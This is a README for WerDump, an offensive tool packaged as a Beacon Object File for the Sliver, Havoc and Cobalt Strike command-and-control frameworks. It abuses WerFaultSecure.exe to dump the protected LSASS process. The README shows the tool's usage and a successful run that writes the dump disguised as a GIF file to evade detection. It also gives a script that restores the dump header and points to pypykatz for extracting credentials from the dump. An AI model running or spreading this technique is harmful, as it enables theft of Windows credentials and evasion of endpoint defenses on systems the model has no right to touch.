# WerDump

A Beacon Object File BOF for Sliver, Havoc and CS to dump Process Protected Lsass using WerFaultSecure.

## Sliver

```shell
sliver > werdump --help

Overcome PPL with WerFaultSecure and Dump Lsass

Usage:
======
  werdump [flags] wer-path pid dump-path signature

Args:
=====
  wer-path   string    The path of the WerFaultSecure file.
  pid        int       The PID of the process you want to dump.
  dump-path  string    The name of the dump file.
  signature  string    Signature used for evasion (default: MDMP).

Flags:
======
  -h, --help           display help
  -t, --timeout int    command timeout in seconds (default: 60)
```

```shell
sliver (PROPER_OBJECTIVE) > werdump 'C:\Programdata\WerFaultSecure.exe' 564 'C:\Programdata\lsass.gif' GIF8

[*] Successfully executed werdump (coff-loader)
[*] Got output:
[+] Enabled SeDebugPrivilege
[*] Main thread ID for PID 888: 912
[+] SUCCESS! Created PPL Process With Pid: [10184], Protection Level [0]
[+] Successfully resumed process 888
[+] Successfully Dumped process 888, Find the dump in the following path lsass.gif
```

This BOF take the path to `WerFaultSecure.exe`, pid of the process to dump, the dump path and the signature to modify the first four bytes of the dump file.

To install the extension on sliver

```shell
$ make install
```

To restore the magic bytes

```shell
$ python3 Scripts/Restore.py lsass.gif lsass.dmp GIF8
Successfully restored MiniDump signature in 'lsass.dmp'
Now run [ pypykatz lsa minidump lsass.dmp ] to parse the minidump
```

## Havoc

See the original implementation

# Credits

- Two Seven One Three  [TwoSevenOneT - WSASS](https://github.com/TwoSevenOneT/WSASS)
- M1ndo [WerDump](https://github.com/M1ndo/WerDump/)